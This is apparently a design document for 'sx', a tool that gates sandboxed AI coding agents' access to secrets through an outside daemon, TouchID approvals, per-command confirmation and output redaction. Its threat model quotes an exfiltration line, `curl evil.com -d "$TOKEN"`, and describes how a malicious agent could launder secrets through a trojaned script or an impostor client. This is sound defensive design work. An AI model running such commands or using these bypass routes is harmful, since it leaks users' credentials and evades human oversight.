# sx — conditioned secret access for sandboxed agents

## Problem

AI coding agents (Claude Code, Codex, …) need secrets to do real work, but the
usual ways of giving them secrets are leaky:

- **Environment variables on the agent process** — the whole agent (and its LLM
  context, transcripts, and logs) can read them. One stray `printenv` or an
  accidental log line ships the secret to the model provider.
- **A `.env` file the agent reads** — requires giving the agent read access to
  the file, which defeats sandboxing it.

We want secrets to be *usable* by programs the agent runs, while being
*unreadable* by the agent itself, with a human in the loop at the moments that
matter.

## The hard truth this design accepts

If a secret is in the environment of a process whose command line the agent
chose, the agent can read it (`printenv`, `curl evil.com -d "$TOKEN"`, …).
"Using" and "reading" are the same operation when the agent writes the code that
receives the secret. So we do **not** claim to stop a determined malicious agent
with arbitrary code execution from exfiltrating a secret it has been allowed to
use. What we *do* provide:

1. The secret value never enters the agent's own process or context.
2. Access is **gated by a human** at two levels — a TouchID grant per `.env`
   file (1 hour), and, by default, a confirmation of each command — unless the
   file is explicitly opted out with `grant-all`.
3. Casual/accidental leakage (secrets in transcripts, logs, echoed output) is
   blocked by redaction.

For protection against an actively malicious agent, pair this with a sandbox
that restricts network egress (so a read secret still can't leave). That is a
deployment concern, layered on top — not something this tool can do alone.

## Threat model

- **Primary: the careless agent.** Keep secrets out of the LLM transcript, logs,
  scrollback, and disk locations a sandbox can't protect. Fully addressed.
- **Secondary: casual exfiltration.** `printenv`, echoed secrets, obvious
  `curl` to an attacker. Addressed by the per-command prompt (the human sees the
  exact command before any value is released) plus output redaction. A file
  opted into `grant-all` waives the per-command prompt for its window, leaning on
  redaction (and egress restriction) instead — so reserve it for low-sensitivity
  files.
- **Out of scope alone: a determined malicious agent** that launders the secret
  through an approved-but-trojaned command (e.g. an agent-authored `deploy.sh`).
  Mitigated only when combined with network egress control.

## Architecture: a secrets oracle + an in-sandbox executor

```
┌─────────────────── agent sandbox ─────────────────────────┐
│  agent ──runs──> sx ──execs──> child (gh, curl, …)         │
│                   │ ▲           (inherits sx's sandbox,    │
│   names/argv ─────┘ │ values     gets the secret in env)   │
└─────────────────────┼─────────────────────────────────────┘
                      │ unix socket (gated release of values)
┌─────────────────────┼──── outside the sandbox ────────────┐
│                      ▼                                     │
│   sxd (daemon): reads .env, TouchID gate, holds captured  │
│   secrets in RAM w/ TTL. Does NOT execute anything.       │
└────────────────────────────────────────────────────────────┘
```

Two design rules drive this split:

1. **The store must be outside the sandbox.** A sandbox restriction is inherited
   by child processes, so an `sx` the agent runs *inside* the sandbox cannot be
   granted file access the agent lacks. So the component that reads `.env` /
   keychain (`sxd`) lives **outside**, reachable only over the socket.

2. **Execution must be inside the sandbox.** If the daemon spawned the command,
   that child would run in the daemon's *unsandboxed* context — making `sxd` a
   general "run anything outside the sandbox" oracle, i.e. a privilege-escalation
   primitive. So the daemon never executes. Instead it returns the values
   (gated) to `sx`, and `sx` — already inside the sandbox — injects them and
   execs the command as its own child. The child inherits `sx`'s confinement; it
   is no more powerful than any command the agent could already run, plus one
   env var.

The cost of rule 2: plaintext briefly enters one in-sandbox process (`sx`).
`sx` is therefore the trusted single point that holds a value inside the
sandbox — see "Trusting `sx`" below.

### Components

- **`sx-proto`** — newline-delimited JSON wire types (`Request`/`Response`) and
  the agreed socket path (`$SX_SOCKET`, else `$HOME/.sx/sxd.sock`).
- **`sxd`** — the daemon / secrets oracle. Reads `.env`, gates grants, holds
  granted secrets in memory with a 1h TTL. Never executes a command. Service
  subcommands: `install` (register the LaunchAgent + run `setup`), `setup`
  (resolve the `aws` CLI path into `~/.sx/config`), `uninstall`.
- **`sx`** — the in-sandbox client. For `run`, it receives the granted values and
  execs the command itself, redacting the values from the child's output.
  Subcommands: `run` (`--env <path>`, `--aws-profile <name>`, `--grant-all`),
  `grant-all`, `clear` (`--aws-profile <name>` or a path), `status`/`list`.
  `run`/`grant-all` require at least one `--env` or `--aws-profile`.

## Trusting `sx`

Because `sx` briefly holds plaintext inside the sandbox, it is the single point
that could leak a value. "It's open source" protects the *user who runs the real
`sx`*, but does not bind an adversarial agent, which can run a look-alike binary
that connects to the socket, or scrape the real `sx`'s memory. So the trust has
to be **enforced**, not assumed (tracked, not yet implemented):

- **Peer attestation.** Before releasing values, the daemon verifies the socket
  peer *is* the genuine, code-signed `sx`, via the connection's **audit token**
  (`LOCAL_PEERTOKEN`) and `SecCodeCheckValidity` against a signing requirement.
  Audit token, not pid (pids are reuse/race-prone).
- **Hardened runtime, no `get-task-allow`.** Built this way, other same-uid
  processes cannot attach to `sx` or read its memory.

Until both land, the grant binding is only as strong as the agent's honesty: a
same-uid impostor could obtain values once a grant is live. The careless-agent
and casual-exfil guarantees still hold.

## The two gates

Two independent, time-boxed human checkpoints. A source (`--env <path>` and/or
`--aws-profile <name>`) is required on every call (no ambient session state);
`.env` paths are resolved against the caller's verified cwd and **canonicalized**,
while AWS profiles are keyed under a synthetic `aws:<profile>` identity.

1. **File grant (per `.env`, 1 hour).** The first use of a canonical path shows
   it (plus the command that triggered it) and asks the user (TouchID) to grant
   that file for one hour. On approval the values are read into daemon memory
   with a 1h TTL; later runs reuse them without re-reading the file. This bounds
   *which* files are live and *for how long*. `sx clear <path>` revokes early.

2. **Per-command confirmation (default, every run).** By default *every*
   `sx run --env <path> -- cmd` prompts to approve **that specific command**
   before the values are released — a live file grant does **not** authorize
   silent use. (On the very first run the file-grant prompt doubles as the first
   command's confirmation.) Re-validated after approval, so a grant that expires
   at the prompt is denied.

**Opting sources out — `grant-all`.** `sx grant-all --env <path>` (or
`sx run --grant-all --env <path> -- cmd`) marks a source *allow-all* for its 1h
window: one prompt up front, then no per-command confirmation. Standalone
`grant-all` accepts multiple repeatable sources, so one prompt can cover several
files/profiles for the same lease. This is the `sudo`-timestamp / `aws-vault`
ergonomic escape hatch, **off by default** — you ask for it per source or
source batch. While allow-all, any command against that source is unprompted, so
redaction and (eventually) egress restriction are the only backstops; reserve it
for low-sensitivity sources. `sx status` shows each grant's mode (`[confirm
each command]` vs `[allow-all]`).

## How a secret is used

```
sx run --env .env -- gh pr create --title "..."
```

1. `sx` sends `{env:[".env"], argv:[gh, pr, create, …], grant_all:false}`.
2. Daemon derives the caller's cwd (verified peer pid), resolves + canonicalizes
   each `--env` path.
3. For each path it runs the two gates: grant the file if not live, then (unless
   the file is allow-all) confirm this command. Refusal → `Denied`.
4. Daemon returns `Granted{secrets}` — the merged values — to `sx`. It spawns
   nothing.
5. `sx` injects the values and execs `gh …` as **its own child**, in `sx`'s cwd,
   inside the sandbox.
6. `sx` captures the child's stdout/stderr, **redacts** every injected value, and
   relays them. The agent only ever sees the redacted output.

## Backends

A *source* is anything the daemon can turn into a name→value map. Every source
sits behind the same daemon, the same 1h grant/TTL, the same double gate, the
same `status`/`clear`, and the same output redaction — they differ only in how
values are produced and in the subject shown at the human prompt.

- **`.env` (today).** Frictionless: point `--env` at a file in any project dir.
  Plaintext at rest — security rests on the daemon being outside the sandbox.
  Keyed in daemon memory under the file's canonical path.
- **AWS profile (today).** `--aws-profile <name>` mints *temporary* credentials
  by shelling out to the AWS CLI:
  `aws configure export-credentials --profile <name> --format env-no-export`.
  The CLI is the source of truth for the user's profile config, so this one
  mechanism uniformly resolves **SSO**, **assume-role**, and **static** profiles
  and prints `KEY=VALUE` lines (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`,
  `AWS_SESSION_TOKEN`, and usually `AWS_CREDENTIAL_EXPIRATION` / `AWS_REGION`),
  injected verbatim. No AWS SDK is linked in. The grant is keyed under a
  synthetic `aws:<profile>` source (never a filesystem path, so it bypasses cwd
  resolution/canonicalization) and held for the same 1h TTL; `sx clear
  --aws-profile <name>` revokes it early. If `aws` is missing or exits non-zero,
  the daemon returns the captured stderr as a denial/error — it never folds that
  output into a successful grant. A single `sx run --env .env --aws-profile prod
  -- cmd` runs every gate and merges both sources' values.

  **The `aws` CLI path is resolved once at setup, not searched at runtime.**
  launchd starts `sxd` as a LaunchAgent with a minimal `$PATH`
  (`/usr/bin:/bin:/usr/sbin:/sbin`), so a daemon-side `Command::new("aws")` can't
  find `/usr/local/bin/aws` (or Homebrew's). Guessing extra PATH dirs is brittle.
  Instead `sxd setup` (auto-run by `sxd install`) — which executes in the user's
  real shell environment with the full `$PATH` — scans `$PATH` for an executable
  `aws` and writes its absolute path to `~/.sx/config` under `aws_cli_path` (a
  tiny `KEY=VALUE` file in the same `~/.sx` dir as the socket and log; reused
  `dotenvy` parses it). `mint_aws` reads that key fresh on every mint and spawns
  the stored absolute path verbatim — it NEVER searches `$PATH`. Reading fresh
  means a freshly-written config takes effect on the next mint with no launchd
  reload. A missing/unset key, or a configured path that's gone/non-executable,
  returns a `Response::Error` telling the user to run `sxd setup`. `$SX_AWS_PATH`
  overrides the config (for tests/CI) but never re-enables a bare PATH search.
- **OS keychain (planned).** Via the `keyring` crate (macOS Keychain, Linux
  Secret Service, Windows Credential Manager). Adds encryption at rest and, on
  macOS, a hardware-backed `kSecAccessControl`/TouchID gate on the item itself.

All sources sit behind the same daemon and the same double gate.

## Agent integration

- **CLI under Bash.** Both Claude Code and Codex drive a shell; `sx run …` is
  the sanctioned path. The sandbox is configured to block direct `.env` /
  keychain access so `sx` is the only way through.
- **MCP server (planned).** Expose `list_secrets` + `run_with_secrets` so the
  agents get secrets as a first-class tool. Note MCP results land in the model's
  context, so redaction matters there too.

## Peer authentication (implemented)

The daemon never trusts what the client *says* about its identity or location.
On each connection it reads the peer's credentials from the kernel via the
socket:

- **uid** via `getpeereid` — connections from any uid other than the daemon's
  own are refused, so only the owning user can reach their secrets.
- **pid** via `LOCAL_PEERPID` (macOS) / `SO_PEERCRED` (Linux), from which the
  daemon derives the caller's **verified cwd** (`proc_pidinfo` /
  `PROC_PIDVNODEPATHINFO` on macOS, `/proc/<pid>/cwd` on Linux).

`.env` paths are resolved, and `run` children are spawned, against that derived
cwd — the client sends no `cwd` field at all, so it cannot point the daemon at
an arbitrary `.env` or run a child in a directory it doesn't actually occupy.

## Approval gates (implemented)

The grant gate is an `ApprovalGate` trait with three implementations:

- **`TouchIdGate` (default on macOS).** Presents the system authentication
  sheet via LocalAuthentication (`LAPolicyDeviceOwnerAuthentication` — TouchID,
  Apple Watch, or passcode). A thin Objective-C shim (`src/touchid.m`, built by
  `build.rs`) blocks on a dispatch semaphore until the user responds. A user
  *cancel* is a denial; it only falls back to the terminal gate when the policy
  cannot be evaluated at all (no passcode set).
- **`CliGate` (`--cli-gate`, default off-macOS).** Yes/no on the daemon's TTY.
- **`AllowAllGate` (`--no-gate`).** Tests only.

## Known v1 simplifications (tracked, not hidden)

- **`sx` identity is not yet attested.** The plaintext is released to whatever
  same-uid process connects; until audit-token code-sign attestation lands, an
  impostor `sx` could obtain it (see "Trusting `sx`").
- **No per-session grant scoping yet.** Peer auth restricts callers to the
  owning uid, but any process of that uid can use a live grant. Grants should
  additionally be scoped to the session that created them.
- **Fully-interactive commands aren't supported.** `sx run` inherits stdin (so
  piped/redirected input works), but buffers stdout/stderr until the child exits
  so the values can be redacted. A command that must display output *before*
  reading input (a live TUI/pager, an interactive password prompt) won't show it
  until exit. Streaming with incremental redaction is a later enhancement.

## Roadmap

1. ~~Peer-credential auth + cwd derivation.~~ **Done.**
2. ~~TouchID-backed gate on macOS.~~ **Done.**
3. ~~Move execution into the sandboxed client (kill the daemon-as-executor
   escape hatch).~~ **Done.**
4. Attest `sx`'s identity: audit-token code-sign check + hardened runtime.
5. Per-session grant scoping.
6. Keychain backend.
7. Streaming output with incremental redaction.
